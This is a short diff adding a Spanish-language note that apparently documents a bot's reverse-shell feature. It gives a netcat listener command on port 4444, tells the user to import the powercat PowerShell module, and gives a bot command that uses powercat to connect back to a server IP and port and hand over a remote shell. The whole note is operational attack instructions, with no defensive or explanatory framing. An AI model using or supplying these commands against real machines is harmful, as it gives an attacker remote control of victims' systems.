@@ -1,0 +1,8 @@
+
+Conexion Reversa TCP entrega d remote Shell
+
+- Server config: 
+	*  nc -l -p 4444
+- User config
+	* Cargar .\powercat (segun politica podria ser "Import-Module .\powercat.ps1")
+	* Desde el bot : load|powercat|-c <ipServer> -p <pertoServer> -ep
